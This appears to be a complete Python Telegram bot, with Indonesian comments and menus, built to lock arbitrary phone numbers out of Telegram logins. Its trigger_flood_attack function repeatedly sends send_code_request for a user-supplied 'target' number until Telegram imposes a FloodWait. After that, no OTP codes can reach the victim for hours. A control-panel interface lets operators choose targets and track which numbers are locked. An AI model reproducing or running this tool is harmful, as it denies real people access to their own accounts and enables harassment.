import asyncio
import json
import logging
import re
import time
from datetime import datetime, timedelta
from pathlib import Path

from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError, 
    PhoneNumberFloodError, 
    PhoneNumberInvalidError, 
    ApiIdInvalidError
)
from telethon.sessions import StringSession

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

# Konfigurasi Logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# State Global
CONFIG = {}
ACTIVE_FLOODS = {} # Format: {"+628123456": timestamp_until}
FLOOD_ATTACK_MAX_ATTEMPTS = 15
FLOOD_ATTACK_DELAY_SECONDS = 2.0

PHONE_REGEX = re.compile(r"^\+\d{7,15}$")

def load_config():
    path = Path("config.json")
    if not path.exists():
        logger.error("config.json tidak ditemukan!")
        exit(1)
    with open(path, "r") as f:
        return json.load(f)

def normalize_phone(raw: str) -> str:
    digits = re.sub(r"\D", "", raw)
    return "+" + digits

def format_duration(seconds: int) -> str:
    if seconds <= 0: return "0s"
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if s and not parts: parts.append(f"{s}s")
    return " ".join(parts) if parts else "0s"

def get_flood_remaining(phone: str) -> int:
    until = ACTIVE_FLOODS.get(phone)
    if not until: return 0
    remaining = int(until - time.monotonic())
    if remaining <= 0:
        ACTIVE_FLOODS.pop(phone, None)
        return 0
    return remaining

def is_authorized(user_id: int) -> bool:
    return user_id in CONFIG.get("admin_ids", [])

async def trigger_flood_attack(phone: str) -> tuple:
    """Return (seconds, attempts, success, reason)"""
    client = TelegramClient(StringSession(), CONFIG["api_id"], CONFIG["api_hash"])
    attempts = 0
    try:
        await client.connect()
        for _ in range(FLOOD_ATTACK_MAX_ATTEMPTS):
            try:
                await client.send_code_request(phone)
                attempts += 1
            except FloodWaitError as e:
                # SUKSES: Telegram membalas FLOOD_WAIT_X
                ACTIVE_FLOODS[phone] = time.monotonic() + e.seconds
                return e.seconds, attempts, True, "Berhasil memicu FloodWait"
                
            except PhoneNumberFloodError:
                # SUKSES (Sudah terkunci sebelumnya): Nomor sudah dalam masa FloodWait
                ACTIVE_FLOODS[phone] = time.monotonic() + 3600 # Default 1 jam
                return 3600, attempts, True, "Nomor sudah dalam status FloodWait dari Telegram"
                
            except PhoneNumberInvalidError:
                return 0, attempts, False, "Nomor tidak valid atau tidak terdaftar di Telegram."
                
            except ApiIdInvalidError:
                return 0, attempts, False, "API ID / API Hash salah atau diblokir Telegram."
                
            except Exception as e:
                logger.error(f"Error percobaan ke-{attempts}: {e}")
                return 0, attempts, False, f"Error: {str(e)}"
            
            await asyncio.sleep(FLOOD_ATTACK_DELAY_SECONDS)
    finally:
        await client.disconnect()
    return 0, attempts, False, "Batas maksimal percobaan habis tanpa respon FloodWait."

# ================= UI & MENUS =================

def get_main_menu():
    keyboard = [
        [InlineKeyboardButton("🔥 Mulai FloodWait", callback_data="menu_flood")],
        [InlineKeyboardButton("⏳ Cek Status Aktif", callback_data="menu_status")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("⛔ Unauthorized")
        return

    context.user_data['awaiting_phone'] = False
    text = "🛡️ **FloodWait Control Panel**\n\nSilakan pilih menu di bawah ini:"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=get_main_menu())

# ================= CALLBACK HANDLER =================

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = update.effective_user.id

    if not is_authorized(user_id):
        await query.answer("⛔ Unauthorized", show_alert=True)
        return

    data = query.data

    if data == "main_menu":
        context.user_data['awaiting_phone'] = False
        await query.edit_message_text(
            "🛡️ **FloodWait Control Panel**\n\nSilakan pilih menu di bawah ini:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_menu()
        )

    elif data == "menu_flood":
        context.user_data['awaiting_phone'] = True
        await query.edit_message_text(
            "📱 **Silakan ketik nomor target**\n\n"
            "Contoh: `628123456789` atau `+628123456789`\n\n"
            "*Ketik /start untuk membatalkan*",
            parse_mode=ParseMode.MARKDOWN
        )

    elif data == "menu_status":
        context.user_data['awaiting_phone'] = False
        lines = ["⏳ **Nomor dalam FloodWait**\n"]
        any_flood = False
        for phone in list(ACTIVE_FLOODS.keys()):
            remaining = get_flood_remaining(phone)
            if remaining > 0:
                any_flood = True
                lines.append(f"• `{phone}` — {format_duration(remaining)}")
        
        if not any_flood:
            lines.append("✅ Tidak ada nomor yang terkunci.")
        
        keyboard = [[InlineKeyboardButton("🔙 Kembali", callback_data="main_menu")]]
        await query.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif data.startswith("confirm_flood_"):
        phone = data.replace("confirm_flood_", "")
        await query.answer("Memulai proses...")
        
        await query.edit_message_text(
            f"🔥 **Memproses {phone}...**\n\n"
            f"Sedang menembak `send_code_request` ke Telegram. Mohon tunggu...",
            parse_mode=ParseMode.MARKDOWN
        )

        seconds, attempts, success, reason = await trigger_flood_attack(phone)

        if success:
            until_utc = (datetime.utcnow() + timedelta(seconds=seconds)).strftime("%H:%M UTC")
            text = (
                f"✅ **Nomor Berhasil Dikunci**\n\n"
                f"Nomor: `{phone}`\n"
                f"Durasi: **{format_duration(seconds)}** (Sampai {until_utc})\n"
                f"Percobaan: {attempts}x\n"
                f"Status: _{reason}_\n\n"
                f"🛡️ Tidak ada OTP yang bisa dikirim ke nomor ini selama periode tersebut."
            )
        else:
            text = (
                f"⚠️ **Proses Tidak Berhasil**\n\n"
                f"Nomor: `{phone}`\n"
                f"Percobaan: {attempts}x\n"
                f"Alasan: **{reason}**"
            )

        keyboard = [[InlineKeyboardButton("🔙 Menu Utama", callback_data="main_menu")]]
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "cancel_flood":
        context.user_data['awaiting_phone'] = False
        await query.answer("Dibatalkan")
        await query.edit_message_text(
            "❌ Dibatalkan. Kembali ke menu utama.",
            reply_markup=get_main_menu()
        )

# ================= MESSAGE HANDLER (INPUT NOMOR) =================

async def handle_phone_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_phone'):
        return

    if not is_authorized(update.effective_user.id):
        return

    raw_phone = update.message.text.strip()
    phone = normalize_phone(raw_phone)

    if not PHONE_REGEX.match(phone):
        await update.message.reply_text(
            f"❌ Format salah: `{raw_phone}`\n"
            f"Gunakan format: `628123456789`\n\n"
            f"Ketik /start untuk membatalkan.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    remaining = get_flood_remaining(phone)
    if remaining > 0:
        await update.message.reply_text(
            f"⏳ Nomor `{phone}` sudah terkunci.\nSisa waktu: **{format_duration(remaining)}**", 
            parse_mode=ParseMode.MARKDOWN
        )
        context.user_data['awaiting_phone'] = False
        return

    context.user_data['awaiting_phone'] = False
    
    keyboard = [
        [InlineKeyboardButton("✅ Ya, Lock Nomor", callback_data=f"confirm_flood_{phone}")],
        [InlineKeyboardButton("❌ Batal", callback_data="cancel_flood")]
    ]
    
    await update.message.reply_text(
        f"🔥 **Konfirmasi FloodWait**\n\n"
        f"Target: `{phone}`\n\n"
        f"Bot akan memanggil `send_code_request` berulang sampai Telegram membalas FloodWait.\n"
        f"Efek: Siapa pun (termasuk Anda) tidak akan bisa meminta OTP baru selama periode ini.\n\n"
        f"Lanjutkan?",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ================= MAIN =================

def main():
    global CONFIG
    CONFIG = load_config()

    logger.info("Memulai FloodWait Bot...")
    app = Application.builder().token(CONFIG["bot_token"]).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_input))

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()